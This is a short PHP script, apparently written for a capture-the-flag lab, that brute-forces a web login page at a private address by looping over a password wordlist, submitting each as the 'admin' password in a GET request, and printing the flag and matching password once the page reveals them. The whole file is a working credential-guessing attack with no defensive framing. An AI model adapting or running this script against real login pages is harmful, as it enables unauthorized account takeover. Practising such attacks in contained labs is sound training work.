<?php

$br = new brut_force();
$br->run();


Class brut_force {

	private $mdps = [];

	public function __Construct() {

		$this->mdps = file('data/mdp');
	}

	public function run() {


		foreach ($this->mdps as $value) {

			$value = str_replace("\n", "", $value);

			$rep = file_get_contents('http://192.168.1.16/index.php?page=signin&username=admin&password='.$value.'&Login=Login#');
			preg_match_all("#flag is :(.*)</h2>#", $rep, $matches);
			
			if (isset($matches[1][0])) {
				
				echo "flag : ".$matches[1][0]." mot de passe : ".$value;
				exit(0);
			}
		}
	}
}

?>